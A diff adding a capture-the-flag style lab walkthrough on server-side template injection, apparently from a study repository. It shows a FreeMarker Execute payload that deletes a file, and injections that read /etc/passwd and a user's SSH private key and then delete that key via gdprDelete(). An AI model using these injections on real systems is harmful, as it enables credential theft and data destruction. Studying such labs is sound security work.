@@ -1146,7 +1146,76 @@ ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 
 
 
+<details>
+  <summary>Lab: Server-side template injection with a custom exploit</summary>
 
+
+1. login with **`wiener`**
+2. change avatar
+3. intercept the request
+4. when change **`name`** form `avatar` to anything found 
+
+<img width="1568" height="483" alt="image" src="https://github.com/user-attachments/assets/f82090f3-9a94-4c3b-94fc-163b7079e659" />
+
+- **`/home/carlos/avatar_upload.php`**
+
+### 5. i try to create **`php`** file and upload it instead found
+
+<img width="1134" height="171" alt="image" src="https://github.com/user-attachments/assets/b09861a0-0455-4044-b5bd-897f2e949d19" />
+
+- **`/home/carlos/User.php`**
+- **`setAvatar('/tmp/file.php', 'application/x-p...')`** founction take image and type
+
+## aslo when update the name found in request
+
+<img width="959" height="146" alt="image" src="https://github.com/user-attachments/assets/a41b6963-655f-48f2-b732-12c25d83acff" />
+
+- **`user.name`** 
+
+## what if i change **`user.name`** and make it **`user.setAvatar('/etc/passwd','image/jpg')`** and go to image to see if it excuted
+
+> ### note refresh teh blog page because the image reflectd there first then veiw image of  user found
+
+<img width="1579" height="539" alt="image" src="https://github.com/user-attachments/assets/06419e3c-f438-40bf-9499-8251a75d422d" />
+
+## wow now let's try to see path that we found before **`/home/carlos/User.php`**
+
+
+<img width="1584" height="601" alt="image" src="https://github.com/user-attachments/assets/d5ed361a-3d9f-4316-8999-b308c621d561" />
+
+## found php code that will help us to remove **`id_rsa`** file of carlos
+
+```php
+public function gdprDelete() {
+        $this->rm(readlink($this->avatarLink));
+        $this->rm($this->avatarLink);
+        $this->delete();
+    }
+```
+
+## now if we 
+
+- put **`/home/carlos/.ssh/id_rsa`** as avatar then
+- call **`gdrDelete()`**
+- we can remove it
+
+## this is **`id_rsa`**
+
+<img width="1496" height="305" alt="image" src="https://github.com/user-attachments/assets/eb537eb1-5a14-493b-aaf8-b0b5d4c3485c" />
+
+## call **`gdrDelete()`**
+
+```
+blog-post-author-display=user.gdprDelete()&csrf=kh8EwITksvFkoxA1jTpS9ntQL0NqU6BN
+```
+
+gdrDelete()
+
+
+
+
+  
+</details>
 
 
 
